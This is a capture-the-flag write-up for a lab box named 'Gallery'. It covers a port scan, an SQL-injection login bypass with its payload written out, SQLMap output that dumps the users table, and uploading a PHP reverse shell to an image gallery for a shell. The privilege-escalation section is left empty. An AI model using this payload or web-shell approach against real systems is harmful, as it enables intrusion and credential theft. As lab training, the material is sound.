# Gallery

**CTF Domain: Gallery.ctf**

## Scans

```rustscan -a Gallery.ctf```

```
Nmap scan report for Gallery.ctf (10.10.91.172)
Host is up, received syn-ack (0.095s latency).
Scanned at 2022-02-16 20:37:16 EST for 0s

PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack
8080/tcp open  http-proxy syn-ack
```

## Eumeration

Website on :80 seems to be just a default Apache webpage

Website on :8080 brings us to a login page

Using a proxy, we can find that logging in returns a JSON object with the SQL query
```
SELECT * from users where username = 'admin' and password = md5('test')
```

This is definitely injectable!

The CTF asks for the hashed password for the "admin" user, we'll use this as a username

For a password, we need to enter in a random string to have it hashed, then escape the function, add "OR 1=1" to bypass the authentication, and a comment at the end for good measure.
```
test')+OR+1%3d1%3b+--+-
```

I tried to do this in the browser but it was not working, so I sent the request in Burp then copied the PHP session to my browser (it worked later on)

And we have the admin account!

## SQLMap

A question asks us to get the admin account hash, lets see if we can get that through SQLi

SQLMap is very helpful, it can find all of the information for us, for example the DB name:
```
available databases [2]:
[*] gallery_db
[*] information_schema
```

Using the DB name we can then get the tables:
```
album_list
[21:58:26] [INFO] retrieved: images
[21:58:47] [INFO] retrieved: system_info
[21:59:37] [INFO] retrieved: users
```

The users table looks about right, lets dump that!
```
Columns:
[22:02:37] [INFO] retrieved: id
[22:02:46] [INFO] retrieved: firstname
[22:03:20] [INFO] retrieved: lastname
[22:03:51] [INFO] retrieved: username
[22:04:21] [INFO] retrieved: password
[22:04:56] [INFO] retrieved: avatar
[22:05:17] [INFO] retrieved: last_login
```

(I stopped here because it takes sooooo long with time attacks)

Dumping the username and password column got us the hash!

```
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | $HASH                            |
+----------+----------------------------------+
```

## Exploitation

Website is an image gallery, maybe we can upload a webshell?

In /gallery/?page=albums we can make a new album and upload a picture

Uploading the simple PHP reverse shell works easily

Setting up pwncat and accessing the image pops a shell on the machine!


## Privilege Escalation



